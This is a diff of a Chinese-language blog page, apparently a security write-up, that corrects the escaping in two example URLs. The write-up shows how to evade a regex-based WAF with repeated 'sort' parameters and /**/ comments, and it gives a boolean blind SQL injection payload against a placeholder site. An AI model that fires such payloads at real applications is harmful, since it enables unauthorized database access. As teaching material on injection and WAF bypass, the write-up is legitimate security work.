@@ -824,7 +824,7 @@
 <p>首先waf是基于正则进行拦截的，但是通过多个sort的参数进行传输数据肯定不会命中waf的策略，现在只需要想办法可以控制逗号，即可进行注入</p>
 <p>这里可以选择&#x2F;**&#x2F;注释符</p>
 <p>可以这样构造</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name/\*&amp;sort=\*/10000</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name/*&amp;sort=*/10000</span><br></pre></td></tr></table></figure>
 
 <p>此时看下报错</p>
 <p><img src="/../images/1/image-20230621104852545.png" alt="image-20230621104852545"></p>
@@ -833,7 +833,7 @@
 
 <p>此时已经将,注释掉</p>
 <p>然后就可以构造完整的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name&amp;sort=1/(case/\*&amp;sort=\*/when+length(user)%3e1+then+1+else+0+end)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysite/page?page=1&amp;size=40&amp;sort=name&amp;sort=1/(case/*&amp;sort=*/when+length(user)%3e1+then+1+else+0+end)</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../images/1/image-20230621105156684.png" alt="image-20230621105156684"></p>
 <p>数据正常返回，说明用户名长度&gt;1，之后正常进行注入即可</p>
